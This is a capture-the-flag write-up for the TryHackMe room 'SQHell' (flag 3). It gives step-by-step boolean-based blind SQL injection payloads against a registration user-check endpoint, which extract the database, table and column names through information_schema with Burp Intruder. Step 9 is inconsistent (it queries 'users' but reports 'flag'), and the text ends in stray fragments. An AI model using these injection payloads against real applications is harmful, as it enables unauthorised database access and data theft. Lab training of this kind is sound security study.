
https://tryhackme.com/room/sqhell

## Flag 3

ASCII to text: https://www.duplichecker.com/ascii-to-text.php

Here `true` mean `no` and `false` mean `yes`
paylod

1.  `/register/user-check?username=admin` this query give us `false` it mean there have an username called `admin`.
2. `/register/user-check?username=admin' AND 1=1--+` this query give use `false`
3. `/register/user-check?username=admin' AND 1=2--+` this query give use `true`
4. Find the length of the database name. `/register/user-check?username=admin' AND LENGTH(DATABASE()) = 8--+` so database name is 8 character long.
5. Find the database name `/register/user-check?username=admin' AND ASCII(SUBSTR(DATABASE(),§1§,1))=§48§--+` send the query to Intruder and user cluster bomb attack. And false return this ASCII value **(115 113 104 101 108 108 95 51)** is equal to `sqhell_3`
6. Find the length of table-0 name `/register/user-check?username=admin' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1) = 4--+` the table name is 4 character long.
7. Find the table-0 name `/register/user-check?username=admin' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1),§1§,1))=§48§--+` send the query to Intruder and user cluster bomb attack. And false return this ASCII value **(102 108 97 103)** is equal to `flag`
8.  Find the column length query `/register/user-check?username=admin' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='flag' LIMIT 1,1) = 4--+` the column name is 4 character long.
9. Find the column name `/register/user-check?username=admin' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1),§1§,1))=§48§--+` send the query to Intruder and user cluster bomb attack. And false return this ASCII value **(102 108 97 103)** is equal to `flag`
10. By using this method we can find
	1. Database Name: sqhell_3
	2. Tables: {'flag', 'users'}
	3. Columns: {'flag': ('id', 'flag'), 'users': ('id', 'username', 'password')}
11. a
12. 